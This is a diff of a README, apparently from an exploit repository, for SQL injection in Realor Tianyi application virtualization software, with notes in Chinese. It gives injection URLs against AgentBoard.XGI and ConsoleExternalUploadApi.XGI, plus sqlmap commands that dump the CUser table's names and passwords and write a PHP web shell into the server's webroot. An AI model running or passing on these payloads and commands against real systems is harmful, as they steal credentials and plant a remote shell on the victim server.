@@ -1,13 +1,23 @@
 # realor-sql-Injection-exp
 瑞友天翼应用虚拟化-远程代码执行/sql注入,realor-sql-Injection
 
+### 前言
+共有三个注入点，其实看了源码发现只要没加过滤函数的基本都有注入；即便加了过滤函数(过滤的很少)，能否bypass后续也可以研究
 
-poc: 
+### POC
+poc1: 
 ```
 http://url/AgentBoard.XGI?user='||'1&cmd=UserLogin
 ```
+poc2:
+```
+/ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_1'__pwd_1__serverIdStr_1&sign=98917d27eda97794c471d1692a019182
+```
+poc3:
+GetBSAppUrl 
 
-exp:
+### EXP
+exp1:
 ```
 sqlmap -u 'http://url/AgentBoard.XGI?user='||'1' -D CASSystemDS -T CUser -C name,pwd --dump
 sqlmap -u "" --file-write "/root/shell/shell-php/biaozun.php" --file-dest "C:\RealFriend\Rap Server\WebRoot\3.php"
